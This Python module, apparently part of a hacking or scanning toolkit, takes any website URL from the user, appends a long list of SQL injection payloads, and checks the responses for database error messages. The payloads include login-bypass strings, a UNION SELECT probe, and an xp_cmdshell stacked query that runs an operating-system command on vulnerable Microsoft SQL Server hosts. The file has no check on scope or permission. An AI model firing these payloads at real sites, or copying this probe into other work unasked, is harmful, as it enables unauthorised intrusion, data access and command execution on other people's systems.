import requests

from utils import log_colorize
from utils.abc import BaseModule
from utils.consts import SQL_BANNER


class SqlMap(BaseModule, name="sql-map"):

    @staticmethod
    def execute_sql_queries(url: str) -> None:
        sql_indicators = [
            "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
            "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-",
            "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
            "You have an error in your SQL syntax", "Incorrect syntax near",
            "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
        ]

        sql_provocations = [
            "'", '"', "''", "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "/1000",
            "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
            "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#",
            "' OR 1=1/*",
            "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--",
            "' OR 1=1/*",
            "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR 1=1#",
            "' OR 1=1--",
            "' OR 1=1/*", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*"
        ]

        try:
            found = 0
            for sql_provocation in sql_provocations:
                test_url = url + sql_provocation
                response = requests.get(test_url, timeout=10)
                if response.status_code == 200:
                    for sql_indicator in sql_indicators:
                        if sql_indicator in response.text:
                            found += 1
                            print(log_colorize(
                                f"Sql Map vulnerability has been detected.\n "
                                f"> Error: {sql_indicator}\n"
                                f"> Provocation: {sql_provocation}",
                                color=0x6BFF73,
                                prefix=">"
                            ))
                            break

                else:
                    print(log_colorize(f"Error : {response.status_code} - {response.reason} - {response.text}", color=0x9487F4, prefix="@"))
        except Exception as e:
            print(log_colorize(f"Error : {type(e).__name__} - {e}", color=0x9487F4, prefix="@"))
        else:
            if not found:
                print(log_colorize("No vulnerability detected", color=0x5386E5, prefix=">"))

    def run(self) -> None:
        self.print_banner(SQL_BANNER)
        print(log_colorize("Input website url", color=0x5386E5, prefix="<"), end="")
        website_url = input()

        if not website_url.startswith(("https://", "http://")):  # noqa
            website_url = "https://" + website_url

        self.execute_sql_queries(website_url)


def load() -> BaseModule:
    return SqlMap()


if __name__ == "__main__":
    with load() as module:
        module.run()
